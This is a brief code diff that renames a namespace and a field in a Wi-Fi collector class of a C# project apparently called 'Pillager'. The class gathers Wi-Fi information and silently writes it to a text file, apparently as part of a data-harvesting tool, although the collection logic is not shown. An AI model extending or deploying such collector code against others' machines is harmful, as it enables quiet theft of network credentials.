@@ -4,11 +4,11 @@ using System.Text;
 using System.Xml;
 using Pillager.Helper;
 
-namespace Pillager.Others
+namespace Pillager.SystemInfos
 {
     internal class Wifi
     {
-        public static string OtherName = "Wifi";
+        public static string SystemInfoName = "Wifi";
         private static string GetMessage()
         {
             const int dwClientVersion = 2;
@@ -72,12 +72,12 @@ namespace Pillager.Others
         {
             try
             {
-                string savepath = Path.Combine(path, OtherName);
+                string savepath = Path.Combine(path, SystemInfoName);
                 string wifi = GetMessage();
                 if (!string.IsNullOrEmpty(wifi))
                 {
                     Directory.CreateDirectory(savepath);
-                    File.WriteAllText(Path.Combine(savepath, OtherName + ".txt"), wifi);
+                    File.WriteAllText(Path.Combine(savepath, SystemInfoName + ".txt"), wifi);
                 }
             }
             catch { }
